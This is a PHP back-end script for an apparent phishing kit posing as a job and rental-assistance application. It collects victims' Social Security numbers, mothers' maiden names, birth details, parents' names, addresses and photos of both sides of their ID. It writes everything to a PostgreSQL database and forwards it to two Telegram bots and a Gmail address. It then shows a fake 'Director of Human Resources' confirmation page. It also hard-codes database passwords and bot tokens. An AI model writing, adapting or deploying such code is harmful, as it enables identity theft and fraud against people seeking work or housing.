<?php
// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA (Safe Extraction)
// ======================
$first_name = $_POST['first_name'] ?? '';
$middle_name = $_POST['middle_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';
$phone = $_POST['phone'] ?? '';
$email = $_POST['email'] ?? '';
$dob = $_POST['dob'] ?? '';
$mother_maiden = $_POST['mother_maiden'] ?? '';
$ssn = $_POST['ssn'] ?? '';
$birth_city = $_POST['birth_city'] ?? '';
$address_line1 = $_POST['address_line1'] ?? '';
$address_line2 = $_POST['address_line2'] ?? '';
$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip_code = $_POST['zip_code'] ?? '';

$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
$father_name = $_POST['father_name'] ?? '';
$mother_name = $_POST['mother_name'] ?? '';

// ======================
// FILE UPLOAD FUNCTION (Saves permanently to DB)
// ======================
function processImageToBase64($file) {
    if (isset($file) && $file['error'] == UPLOAD_ERR_OK) {
        $fileData = file_get_contents($file['tmp_name']);
        $mimeType = mime_content_type($file['tmp_name']);
        // Converts file to Base64 so it can be saved in Postgres and never disappear
        return 'data:' . $mimeType . ';base64,' . base64_encode($fileData);
    }
    return null;
}

// Store files straight into RAM/DB to avoid Render's local deletion bug
$front_id_base64 = processImageToBase64($_FILES['front_id']);
$back_id_base64  = processImageToBase64($_FILES['back_id']);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
    first_name, middle_name, last_name,
    phone, email, dob, mother_maiden,
    ssn, birth_city, address,
    father_name, mother_name,
    front_id, back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $first_name, $middle_name, $last_name,
    $phone, $email, $dob, $mother_maiden,
    $ssn, $birth_city, $address,
    $father_name, $mother_name,
    $front_id_base64, $back_id_base64
]);

// ======================
// TELEGRAM BOT SETUP
// ======================
$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
$chat2 = "5469294503";

// ======================
// TELEGRAM SENDING FUNCTIONS
// ======================
function sendTelegramMessage($bot, $chat, $text) {
    $url = "https://telegram.org";
    $data = ['chat_id' => $chat, 'text' => $text];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramFile($bot, $chat, $file, $caption) {
    if (!$file || !isset($file['tmp_name']) || $file['error'] !== UPLOAD_ERR_OK) return;
    
    $url = "https://telegram.org";
    
    // Uploads file binary data stream straight to Telegram safely
    $cFile = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
    $data = [
        'chat_id' => $chat,
        'document' => $cFile,
        'caption' => $caption
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// ======================
// TEXT MESSAGE TEMPLATE
// ======================
$text = "📄 New Application Submitted\n\n"
. "👤 Name: $first_name $middle_name $last_name\n"
. "📞 Phone: $phone\n"
. "📧 Email: $email\n"
. "🎂 DOB: $dob\n"
. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
. "🏙 Birth City: $birth_city\n"
. "👨 Father: $father_name\n"
. "👩 Mother: $mother_name\n"
. "🧾 SSN: $ssn";

// Send Data to Telegram Bot 1
sendTelegramMessage($bot1, $chat1, $text);
sendTelegramFile($bot1, $chat1, $_FILES['front_id'], "🪪 Front ID - $first_name $last_name");
sendTelegramFile($bot1, $chat1, $_FILES['back_id'], "🪪 Back ID - $first_name $last_name");

// Send Data to Telegram Bot 2
sendTelegramMessage($bot2, $chat2, $text);
sendTelegramFile($bot2, $chat2, $_FILES['front_id'], "🪪 Front ID - $first_name $last_name");
sendTelegramFile($bot2, $chat2, $_FILES['back_id'], "🪪 Back ID - $first_name $last_name");

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";
$subject = "New Job Form Submission";
$body = $text;
$headers = "From: noreply@yourdomain.com";

@mail($to, $subject, $body, $headers);

// ======================
// SUCCESS HTML DISPLAY
// ======================
echo "
<div style='
    max-width:700px;
    margin:60px auto;
    padding:50px;
    background:#0f172a;
    color:white;
    border-radius:20px;
    text-align:center;
    font-family:Arial,sans-serif;
    box-shadow:0 10px 30px rgba(0,0,0,0.4);
'>

    <div style='
        font-size:80px;
        color:#22c55e;
        margin-bottom:20px;
    '>✓</div>

    <h1 style='
        font-size:42px;
        margin-bottom:25px;
        color:#ffffff;
    '>
        Form Submitted Successfully!
    </h1>

    <p style='
        font-size:24px;
        line-height:1.8;
        color:#e2e8f0;
    '>
        Thank you for considering
        <strong>Apartment at Home and Rental Assistance</strong>.
        <br><br>
        We will contact you shortly.
    </p>

    <div style='
        margin-top:40px;
        border-top:1px solid #334155;
        padding-top:25px;
    '>
        <h2 style='
            font-size:30px;
            color:#38bdf8;
            margin-bottom:10px;
        '>
            Taylor Luis
        </h2>

        <p style='
            font-size:20px;
            color:#cbd5e1;
        '>
            Director of Human Resources
        </p>
    </div>

</div>
";
?>
